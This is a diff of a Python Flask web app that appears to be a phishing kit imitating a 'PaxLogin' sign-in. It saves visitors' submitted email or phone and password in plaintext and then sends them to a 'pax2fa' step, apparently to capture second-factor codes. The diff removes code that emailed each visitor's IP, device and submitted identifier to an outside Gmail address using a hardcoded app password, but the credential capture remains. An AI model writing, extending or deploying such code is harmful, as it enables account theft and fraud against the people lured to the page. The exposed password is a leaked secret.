@@ -1,10 +1,6 @@
 from flask import Flask, render_template, request, redirect, url_for, session
 import sqlite3
-import smtplib
-from email.mime.text import MIMEText
 import os
-from datetime import datetime
-import threading
 
 app = Flask(__name__)
 app.secret_key = "supersecretkey"  # Needed for session support
@@ -42,53 +38,7 @@ def init_db():
 # Call this once at startup
 init_db()
 
-# --- Background email sender ---
-def send_email_notification(reason, amount, user_ip, user_agent, timestamp):
-    sender = "azevents50@gmail.com"
-    password = "wvvf axbw kzba hank"   # ⚠️ Use environment variable in production!
-    recipient = "centrehillevents@gmail.com"
-
-    subject = "PaxLogin Notification"
-    body = (
-        f"📢 PaxLogin Event Detected\n\n"
-        f"Reason: {reason}\n"
-        f"Amount: {amount}\n\n"
-        f"🕒 Time: {timestamp}\n"
-        f"🌐 IP Address: {user_ip}\n"
-        f"💻 Device: {user_agent}\n"
-    )
-
-    msg = MIMEText(body)
-    msg["Subject"] = subject
-    msg["From"] = sender
-    msg["To"] = recipient
-
-    try:
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
-            server.starttls()
-            server.login(sender, password)
-            server.send_message(msg)
-    except:
-        # Fail silently
-        pass
-
-
-def send_email_async(reason, amount):
-    """Runs email sending in a background thread."""
-    user_ip = request.remote_addr or "Unknown IP"
-    user_agent = request.headers.get("User-Agent", "Unknown Device")
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    # Run the email function in a new thread
-    threading.Thread(
-        target=send_email_notification,
-        args=(reason, amount, user_ip, user_agent, timestamp),
-        daemon=True
-    ).start()
-
-
-
-# --- Routes ---
+# ---------- Routes ----------
 @app.route("/")
 def home():
     return render_template("home.html")
@@ -100,33 +50,17 @@ def paxlogin():
         email_or_phone = request.form.get("email_or_phone")
         password = request.form.get("password")
 
-        # Save credentials in DB
         conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
-        cursor.execute(
-            "INSERT INTO paxlogin (email_or_phone, password) VALUES (?, ?)",
-            (email_or_phone, password)
-        )
+        cursor.execute("INSERT INTO paxlogin (email_or_phone, password) VALUES (?, ?)", 
+                       (email_or_phone, password))
         conn.commit()
         conn.close()
 
         # Store email in session
         session["user_email"] = email_or_phone
 
-        # Async email notification for POST
-        send_email_async(
-            reason=f"User submitted PaxLogin form ({email_or_phone})",
-            amount="N/A"
-        )
-
         return redirect(url_for("pax2fa"))
-
-    # Async email notification for GET
-    send_email_async(
-        reason="PaxLogin page loaded",
-        amount="N/A"
-    )
-
     return render_template("paxlogin.html")
 
 
